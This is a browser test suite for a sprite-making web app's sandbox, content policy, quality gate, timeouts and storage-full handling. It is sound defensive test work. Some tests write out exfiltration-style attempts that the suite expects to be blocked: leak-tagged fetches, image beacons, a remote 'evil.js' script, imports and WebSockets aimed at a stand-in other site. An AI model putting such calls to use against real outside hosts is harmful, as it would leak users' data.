// Safety of assets made on a visit (docs/architecture.md, Contract 11, "Safety of run-time assets").
// The hostile sources are the reviewer's (tests/fixtures/api/hostile.mjs). example.com stands for "another site":
// the test answers it itself and records every request that reaches it, so nothing leaves the machine.
//
//   1  a made source never runs in the page, and cannot reach another site from where it does run
//   2  what is stored, or arrives in a link, is never run on page load, and cannot stop the site from drawing
//   3  the quality gate: nothing unchecked or failing is accepted, drawn or exported; the bag exports what it stored
//   4  hangs: a source that never finishes is stopped, quickly
//   5  storage full: a save that fails is reported
import { test as base, expect } from '@playwright/test';
import { quietNetwork, openRoute, waitForDrawn } from '../helpers/browser.mjs';
import { readZip } from '../helpers/zip-read.mjs';
import { goodSprite, GOOD_SOUND, goodSound } from '../fixtures/api/sources.mjs';
import * as H from '../fixtures/api/hostile.mjs';

const BAG_KEY = 'loadout-bag-v1';

// These tests provoke the browser on purpose (it logs every refusal of the content policy as an error), so they do
// not use the shared `test` that fails on any console error. What must never happen is an error thrown in the page.
const test = base.extend({
  page: async ({ page }, use) => {
    await quietNetwork(page);
    const thrown = [];
    page.on('pageerror', (e) => thrown.push(e.message));
    await use(page);
    expect(thrown, 'nothing was thrown in the page').toEqual([]);
  },
});

/** Answer example.com from here and keep a list of what was asked of it. Returns the list. */
async function watchOtherSite(context) {
  const reached = [];
  await context.route(/^(https?|wss?):\/\/([^/]*\.)?example\.com\//, (route) => { reached.push(route.request().url()); route.fulfill({ status: 200, contentType: 'text/javascript', body: 'globalThis.__remote = true; export default 1;' }); });
  return reached;
}
/** The longest the page went without answering while `work` ran, in ms. */
async function longestStall(page, work) {
  let worst = 0, on = true;
  const watch = (async () => { while (on) { const t = Date.now(); await page.evaluate(() => 1); worst = Math.max(worst, Date.now() - t); await new Promise((r) => setTimeout(r, 100)); } })();
  const result = await work();
  on = false; await watch;
  return { result, worst };
}
const make = (page, src) => page.evaluate((s) => window.loadout.make.sprite(s), src);
const marks = (page) => page.evaluate(() => ({ title: document.title, ran: window.__ran ?? null, remote: window.__remote ?? null, collide: window.__collideRan ?? null, planted: localStorage.getItem('rv-planted'), scripts: [...document.scripts].map((s) => s.src).filter((s) => !s.startsWith(location.origin)) }));
const CLEAN = { ran: null, remote: null, collide: null, planted: null, scripts: [] };
const storedBag = (items) => JSON.stringify({ version: 1, items: items.map((it, i) => ({ key: `i${i + 1}`, addedAt: 1, settings: {}, ...it })), next: items.length + 1 });

// ---- 1 ------------------------------------------------------------------------------------------------------

test('1: a made source does not run in the page: no mark, no title change, no script tag, no request to another site', async ({ page, context }) => {
  const reached = await watchOtherSite(context);
  await openRoute(page, '/');
  const title = await page.title();
  const results = {};
  for (const [name, src] of Object.entries({ fetchOut: H.FETCH_OUT(), marks: H.MARKS(), hidden: H.HIDDEN_IMPORT(), script: H.SCRIPT_TAG(), knight: H.TAKES_KNIGHT })) results[name] = await make(page, src);
  expect(await marks(page)).toEqual({ ...CLEAN, title });
  expect(reached, 'nothing reached the other site').toEqual([]);
  // the ones that touch things only a page has stop where they run, and say why
  for (const name of ['fetchOut', 'hidden', 'script']) { expect(results[name].ok, name).toBe(false); expect(results[name].errors.join(' '), name).toMatch(/could not be loaded|stopped/i); }
  // one that only leaves marks is an ordinary sprite: its marks stayed where it ran
  expect(results.marks).toMatchObject({ id: 'rv-marks', ok: true });
  // an id the catalogue uses is refused, and nothing of it is kept
  expect(results.knight.ok).toBe(false);
  expect(results.knight.errors[0]).toMatch(/already an asset in the catalogue/);
  const listed = await page.evaluate(async () => (await window.loadout.assets.list({ runtime: true })).assets.map((a) => a.id));
  expect(listed).toEqual(['rv-marks']);
  expect((await page.evaluate(() => window.loadout.render('knight', { frame: 0 }))).opaque).toBeGreaterThan(50);
});

test('1: from where it runs, a made source finds no way to another site, to storage, or to the page', async ({ page, context }) => {
  const reached = await watchOtherSite(context);
  await openRoute(page, '/');
  const made = await make(page, H.EVERY_WAY_OUT());
  expect(made).toMatchObject({ id: 'rv-ways', ok: true });
  const report = JSON.parse((await page.evaluate(() => window.loadout.assets.get('rv-ways'))).asset.description);
  expect(report.has, 'what it found to use').toEqual([]);
  const ways = Object.entries(report).filter(([k]) => k !== 'has');
  expect(ways.length).toBeGreaterThanOrEqual(14);
  for (const [way, what] of ways) expect(what, way).toMatch(/^stopped: /);
  expect(reached).toEqual([]);
  expect(await page.evaluate(async () => (await indexedDB.databases()).map((d) => d.name))).not.toContain('rv-planted');
  expect(await page.evaluate(() => caches.has('rv-planted'))).toBe(false);
});

test('1: the site sends a content policy, and under it neither the page nor a worker made from memory reaches another site', async ({ page, context }) => {
  const reached = await watchOtherSite(context);
  const refused = [];
  page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) refused.push(m.text()); });
  await page.goto('/index.html#/');
  await waitForDrawn(page);
  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  for (const part of ["default-src 'self'", "script-src 'self' blob: 'wasm-unsafe-eval'", "connect-src 'self'", "img-src 'self' data: blob:", "font-src 'self'", "worker-src 'self' blob:", "object-src 'none'", "base-uri 'self'"]) expect(policy).toContain(part);
  expect(policy).not.toMatch(/unsafe-eval'(?<!wasm-unsafe-eval')|\*|https?:/);
  const r = await page.evaluate(async () => {
    const far = 'https://example.com/';
    const tried = {};
    const attempt = async (name, fn) => { try { tried[name] = `reached: ${await fn()}`; } catch (e) { tried[name] = `stopped: ${e && e.name}`; } };
    await attempt('fetch', () => fetch(`${far}?leak=1`, { mode: 'no-cors' }).then((x) => x.type));
    await attempt('image', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('blocked')); i.src = `${far}pixel.png?leak=2`; }));
    await attempt('script', () => new Promise((ok, no) => { const s = document.createElement('script'); s.onload = () => ok('ran'); s.onerror = () => no(new Error('blocked')); s.src = `${far}evil.js`; document.head.append(s); }));
    await attempt('import', () => import(`${far}x.js`).then(() => 'imported'));
    await attempt('eval', () => (0, eval)('1 + 1'));
    await attempt('function', () => new Function('return 1')());
    await attempt('webSocket', () => new Promise((ok, no) => { const w = new WebSocket('wss://example.com/'); w.onopen = () => ok('open'); w.onerror = () => no(new Error('blocked')); }));
    // a worker made from memory, the way the site makes the one for made sprites: it carries the page's policy
    await attempt('workerFetch', () => new Promise((ok, no) => {
      const code = `const out = {}; const t = async (n, f) => { try { await f(); out[n] = 'reached'; } catch (e) { out[n] = 'stopped'; } };
        await t('fetch', () => fetch('${far}?leak=3', { mode: 'no-cors' })); await t('import', () => import('${far}y.js')); await t('eval', () => (0, eval)('1'));
        await t('socket', () => new Promise((a, b) => { const w = new WebSocket('wss://example.com/'); w.onopen = a; w.onerror = b; })); postMessage(out);`;
      const w = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' })), { type: 'module' });
      w.onmessage = (e) => (Object.values(e.data).every((v) => v === 'stopped') ? no(Object.assign(new Error('all stopped'), { name: JSON.stringify(e.data) })) : ok(JSON.stringify(e.data)));
      w.onerror = () => no(new Error('worker did not start'));
    }));
    return tried;
  });
  for (const [way, what] of Object.entries(r)) expect(what, way).toMatch(/^stopped: /);
  expect(r.workerFetch).toBe('stopped: {"fetch":"stopped","import":"stopped","eval":"stopped","socket":"stopped"}');
  expect(reached).toEqual([]);
  expect(await page.evaluate(() => window.__remote ?? null)).toBe(null);
  expect(refused.length, 'the browser said it refused them').toBeGreaterThan(3);
});

// ---- 2 ------------------------------------------------------------------------------------------------------

test('2: a stored source that never ends cannot stop the site from drawing, and is listed as needing re-making', async ({ page, context }) => {
  await openRoute(page, '/');
  await page.evaluate(([key, value]) => localStorage.setItem(key, value), [BAG_KEY, storedBag([
    { kind: 'sprite', id: 'rv-brick', definition: { source: H.BRICK() } },
    { kind: 'sprite', id: 'rv-looptop', definition: { source: H.LOOP_AT_TOP() } },
    { kind: 'sprite', id: 'coin' },
  ])]);
  const other = await context.newPage();
  const t0 = Date.now();
  await other.goto('/index.html#/bag');
  await expect(other.locator('.bag-item')).toHaveCount(3, { timeout: 5000 });
  expect(Date.now() - t0, 'the bag page drew at once').toBeLessThan(5000);
  await expect(other.locator('.bag-item .bag-name').last()).toHaveText('Coin');
  // both are tried in the background and given up on; the page answers throughout
  const { worst } = await longestStall(other, () => expect(other.locator('.bag-item.remake')).toHaveCount(2, { timeout: 45_000 }));
  expect(worst, 'longest the page went without answering, ms').toBeLessThan(1500);
  await expect(other.locator('.bag-item.remake').first()).toContainText('rv-brick');
  await expect(other.locator('.bag-item.remake').first()).toContainText(/needs re-making/i);
  await expect(other.locator('.bag-item.remake canvas')).toHaveCount(0);
  // and the rest of the site works
  await other.evaluate(() => window.loadout.go('/sprite/coin'));
  await expect(other.getByRole('heading', { name: 'Coin', level: 1 })).toBeVisible();
});

test('2: a link asks first; after one yes its source still never runs in the page, on any later load', async ({ page, context }) => {
  const reached = await watchOtherSite(context);
  await openRoute(page, '/');
  const link = await page.evaluate(async (sources) => {
    const { createBag, memoryStorage } = await import('/app/bag.js');
    const bag = createBag(memoryStorage());
    for (const [id, source] of sources) bag.add({ kind: 'sprite', id, settings: {}, definition: { source } });
    return bag.toLink();
  }, [['rv-marks', H.MARKS()], ['rv-fetch', H.FETCH_OUT()]]);

  const other = await (await context.browser().newContext()).newPage();
  const otherReached = await watchOtherSite(other.context());
  await other.goto(`/index.html${link}`);
  await expect(other.locator('.bag-offer')).toContainText('made by whoever shared');
  expect((await other.evaluate(() => localStorage.getItem('loadout-bag-v1')) ?? '').includes('rv-marks'), 'nothing is stored before the visitor agrees').toBe(false);
  await other.getByRole('button', { name: 'Open the bag' }).click();
  // the one that only leaves marks is an ordinary sprite and is accepted; the other cannot even load
  await expect(other.locator('.bag-item .bag-name').first()).toHaveText('Test gem', { timeout: 30_000 });
  await expect(other.locator('.bag-item.remake')).toHaveCount(1, { timeout: 30_000 });
  const title = await other.title();
  for (let visit = 0; visit < 3; visit++) {
    await other.reload();
    await waitForDrawn(other);
    await expect(other.locator('.bag-item')).toHaveCount(2);
    await expect(other.locator('.bag-item.remake')).toHaveCount(1, { timeout: 30_000 });
    expect(await marks(other)).toEqual({ ...CLEAN, title });
  }
  expect([...reached, ...otherReached]).toEqual([]);
  await other.context().close();
});

// ---- 3 ------------------------------------------------------------------------------------------------------

test('3: a failing sprite from a link, or from edited storage, is not accepted, drawn or exported', async ({ page, context }) => {
  await openRoute(page, '/');
  // (a) straight into storage, as another site on the same host could do
  await page.evaluate(([key, value]) => localStorage.setItem(key, value), [BAG_KEY, storedBag([
    { kind: 'sprite', id: 'rv-evil', definition: { source: H.EMPTY_AND_MARKS() } },
    { kind: 'sprite', id: 'rv-good', definition: { source: goodSprite('rv-good') } },
    { kind: 'sound', id: 'rv-sound', definition: { patch: { ...goodSound('rv-sound'), nodes: 'none' } } },
  ])]);
  await page.goto('/index.html#/play');
  await page.reload();
  await waitForDrawn(page);
  const a = await page.evaluate(async () => {
    const L = window.loadout;
    const zip = await L.bag.download({ save: false, data: true });
    return { zip, made: (await L.assets.list({ runtime: true })).assets.map((x) => [x.id, x.ok]), evil: await L.assets.get('rv-evil'), draw: await L.render('rv-evil', { frame: 3 }), ran: window.__ran ?? null, items: (await L.bag.items()).items.map((i) => [i.id, i.state]) };
  });
  expect(a.made).toEqual([['rv-good', true]]);
  expect(a.evil.ok).toBe(false);
  expect(a.draw.ok).toBe(false);
  expect(a.ran).toBe(null);
  expect(a.items).toEqual([['rv-evil', 'needs re-making'], ['rv-good', 'ready'], ['rv-sound', 'needs re-making']]);
  expect(a.zip.ok).toBe(true);
  expect(a.zip.files.filter((f) => /rv-/.test(f)).sort()).toEqual(['sprites/rv-good/how-to-use.txt', 'sprites/rv-good/rv-good.json', 'sprites/rv-good/rv-good.png', 'sprites/rv-good/rv-good.source.js']);
  expect(a.zip.needsRemaking.sort()).toEqual(['rv-evil', 'rv-sound']);
  const manifest = JSON.parse(new TextDecoder().decode(readZip(Buffer.from(a.zip.zip.split(',')[1], 'base64')).find((f) => f.name === 'manifest.json').data));
  expect(manifest.needsRemaking.sort()).toEqual(['rv-evil', 'rv-sound']);
  await page.evaluate(() => window.loadout.go('/bag'));
  await expect(page.locator('.bag-item.remake')).toHaveCount(2);
  await expect(page.locator('.bag-item.remake').first()).toContainText('Test gem');            // by its name, with why
  await expect(page.locator('.bag-item.remake').first()).toContainText(/needs re-making/i);

  // (b) a passing one goes in properly, then its stored source is swapped by hand for a failing one
  await page.evaluate(async (src) => { const L = window.loadout; await L.bag.clear(); await L.make.sprite(src); await L.bag.add('rv-ls'); }, goodSprite('rv-ls'));
  await page.evaluate(([key, bad]) => { const j = JSON.parse(localStorage.getItem(key)); j.items[0].definition.source = bad; localStorage.setItem(key, JSON.stringify(j)); }, [BAG_KEY, H.EMPTY('rv-ls')]);
  await page.reload();
  await waitForDrawn(page);
  const b = await page.evaluate(async () => { const L = window.loadout; const zip = await L.bag.download({ save: false }); return { zip, items: (await L.bag.items()).items.map((i) => [i.id, i.state]), get: (await L.assets.get('rv-ls')).ok }; });
  expect(b.items).toEqual([['rv-ls', 'needs re-making']]);
  expect(b.get).toBe(false);
  expect(b.zip.ok).toBe(false);
  expect(b.zip.errors[0]).toMatch(/needs? re-making/i);

  // (c) the same through a link someone agreed to open
  const link = await page.evaluate(async (src) => { const { createBag, memoryStorage } = await import('/app/bag.js'); const bag = createBag(memoryStorage()); bag.add({ kind: 'sprite', id: 'rv-evil', settings: {}, definition: { source: src } }); return bag.toLink(); }, H.EMPTY_AND_MARKS());
  const other = await (await context.browser().newContext()).newPage();
  await other.goto(`/index.html${link}`);
  await other.getByRole('button', { name: 'Open the bag' }).click();
  await expect(other.locator('.bag-item.remake')).toHaveCount(1, { timeout: 30_000 });
  await expect(other.locator('.bag-item.remake')).toContainText(/empty|nothing drawn|no pixels/i);          // what the quality bar found
  const c = await other.evaluate(async () => ({ zip: await window.loadout.bag.download({ save: false }), ran: window.__ran ?? null }));
  expect(c.zip.ok).toBe(false);
  expect(c.ran).toBe(null);
  await other.context().close();
});

test('3: making a bagged asset again with a failing source is refused, and the bag exports what it stored', async ({ page }) => {
  await openRoute(page, '/');
  const r = await page.evaluate(async ([good, bad, better]) => {
    const L = window.loadout;
    const first = await L.make.sprite(good);
    const add = await L.bag.add('rv-swap');
    const remake = await L.make.sprite(bad);
    const after = { items: await L.bag.items(), frame3: await L.render('rv-swap', { clip: 'idle', frame: 3 }), row: (await L.assets.get('rv-swap')).asset };
    const zip = await L.bag.download({ save: false, data: true });
    // a passing new version is taken, and the bag follows it
    const again = await L.make.sprite(better);
    return { first, add, remake, after, zip, again, source: (await L.bag.items()).items[0].definition.source };
  }, [goodSprite('rv-swap'), H.EMPTY('rv-swap'), goodSprite('rv-swap').replace("name: 'Test gem'", "name: 'Better gem'")]);
  expect(r.first.ok).toBe(true);
  expect(r.add.ok).toBe(true);
  expect(r.remake.ok).toBe(false);
  expect(r.remake.kept).toBe(false);
  expect(r.remake.errors.join('\n')).toMatch(/empty|nothing drawn|no pixels/i);
  expect(r.remake.errors.join('\n')).toMatch(/in the bag/);
  expect(r.after.items.items[0].definition.source).toBe(goodSprite('rv-swap'));
  expect(r.after.frame3.opaque, 'the asset is still the version that passed').toBeGreaterThan(20);
  expect(r.after.row).toMatchObject({ ok: true });
  expect(r.zip.ok).toBe(true);
  const files = Object.fromEntries(readZip(Buffer.from(r.zip.zip.split(',')[1], 'base64')).map((f) => [f.name, f.data]));
  expect(new TextDecoder().decode(files['sprites/rv-swap/rv-swap.source.js'])).toBe(goodSprite('rv-swap'));
  // the sheet in the zip is drawn from that same source: frame 3 of the idle row has pixels
  const sheet = await page.evaluate(async (bytes) => {
    const img = await createImageBitmap(new Blob([new Uint8Array(bytes)], { type: 'image/png' }));
    const cv = new OffscreenCanvas(img.width, img.height); const g = cv.getContext('2d'); g.drawImage(img, 0, 0);
    const d = g.getImageData(3 * 32, 0, 32, 32).data; let n = 0; for (let i = 3; i < d.length; i += 4) if (d[i]) n++;
    return n;
  }, [...files['sprites/rv-swap/rv-swap.png']]);
  expect(sheet).toBe(r.after.frame3.opaque);
  expect(r.again).toMatchObject({ ok: true, replaced: true });
  expect(r.source).toContain('Better gem');
});

test('3: two makes of one id at once end as one asset, the later one', async ({ page }) => {
  await openRoute(page, '/');
  const r = await page.evaluate(async (src) => {
    const L = window.loadout;
    const [x, y] = await Promise.all([L.make.sprite(src), L.make.sprite(src.replace("name: 'Test gem'", "name: 'Test gem two'"))]);
    return { x: [x.ok, x.replaced], y: [y.ok, y.replaced], name: (await L.assets.get('rv-race')).asset.name, list: (await L.assets.list({ runtime: true })).assets.map((a) => a.id) };
  }, goodSprite('rv-race'));
  expect(r).toEqual({ x: [true, false], y: [true, true], name: 'Test gem two', list: ['rv-race'] });
});

// ---- 4 ------------------------------------------------------------------------------------------------------

test('4: sources that never finish, or ask for too much, are stopped quickly and the page keeps answering', async ({ page }) => {
  test.setTimeout(180_000);
  await openRoute(page, '/');
  const timed = async (src) => { const t = Date.now(); const { result, worst } = await longestStall(page, () => make(page, src)); return { result, seconds: (Date.now() - t) / 1000, worst }; };

  const top = await timed(H.LOOP_AT_TOP());
  expect(top.result.ok).toBe(false);
  expect(top.result.errors[0]).toMatch(/did not finish loading|10 seconds/);
  expect(top.seconds).toBeLessThan(20);

  const loop = await timed(H.LOOP_IN_RENDER());
  expect(loop.result.ok).toBe(false);
  expect(loop.result.errors[0]).toMatch(/drawing .* took too long|stopped/i);
  expect(loop.seconds, 'a render that never ends is found on the first frame, not after the whole check').toBeLessThan(15);

  const huge = await timed(H.HUGE_FRAME());
  expect(huge.result.ok).toBe(false);
  expect(huge.result.errors[0]).toMatch(/30000 by 30000.*640 by 360/);
  expect(huge.seconds).toBeLessThan(10);

  const many = await timed(H.MANY_FRAMES());
  expect(many.result.ok).toBe(false);
  expect(many.result.errors[0]).toMatch(/10000 frames.*64/);

  const long = await make(page, `// ${'x'.repeat(400_001)}\n${goodSprite('rv-long')}`);
  expect(long.ok).toBe(false);
  expect(long.errors[0]).toMatch(/400,?000/);

  // a loop only the quality bar meets (a control at its far end) is stopped by the check's own limit
  const late = await timed(H.LOOP_WHEN_BIG());
  expect(late.result.ok).toBe(false);
  expect(late.result.errors[0]).toMatch(/60 seconds/);
  expect(late.seconds).toBeLessThan(90);

  for (const run of [top, loop, huge, many, late]) expect(run.worst, 'longest the page went without answering, ms').toBeLessThan(1500);
  // none of them was kept, nothing was drawn, and the next sprite is made as usual
  const after = await page.evaluate(async (src) => { const L = window.loadout; return { listed: (await L.assets.list({ runtime: true })).total, good: await L.make.sprite(src), draw: await L.render('rv-after', { frame: 0 }) }; }, goodSprite('rv-after'));
  expect(after.listed).toBe(0);
  expect(after.good.ok).toBe(true);
  expect(after.draw.opaque).toBeGreaterThan(20);
});

// ---- 5 ------------------------------------------------------------------------------------------------------

test('5: when the browser cannot save the bag, bag.add says so, nothing is half-added, and the bag page says so too', async ({ page }) => {
  await openRoute(page, '/');
  await page.evaluate(async ([a, b, sound]) => { const L = window.loadout; await L.make.sound(sound); await L.make.sprite(a); await L.make.sprite(b); await L.bag.add('coin'); }, [goodSprite('rv-p1'), goodSprite('rv-p2'), GOOD_SOUND]);
  // fill what is left of this site's storage
  await page.evaluate(() => { for (const size of [1024 * 1024, 1024, 16]) { const chunk = 'x'.repeat(size); try { for (let i = 0; ; i++) localStorage.setItem(`junk-${size}-${i}`, chunk); } catch { /* full at this size */ } } });
  const adds = await page.evaluate(async (ids) => { const out = []; for (const id of ids) out.push(await window.loadout.bag.add(id)); return { out, now: await window.loadout.bag.items() }; }, ['rv-p1', 'rv-p2', GOOD_SOUND.id]);
  for (const r of adds.out) { expect(r.ok).toBe(false); expect(r.errors[0]).toMatch(/could not be saved/); expect(r.errors[0]).toMatch(/storage .* full|full/i); }
  expect(adds.now.items.map((i) => i.id), 'what the bag says it holds is what is saved').toEqual(['coin']);
  // the page's own "Add to bag" keeps the item for this visit and the bag page warns that it is not saved
  await page.evaluate(() => window.loadout.go('/sprite/knight'));
  await page.getByRole('button', { name: 'Add to bag' }).click();
  await page.evaluate(() => window.loadout.go('/bag'));
  await expect(page.locator('.bag-item')).toHaveCount(2);
  await expect(page.locator('.bag-unsaved')).toContainText(/could not be saved/);
  await page.reload();
  await waitForDrawn(page);
  await expect(page.locator('.bag-item')).toHaveCount(1);
  expect((await page.evaluate(() => window.loadout.bag.items())).items.map((i) => i.id)).toEqual(['coin']);
});
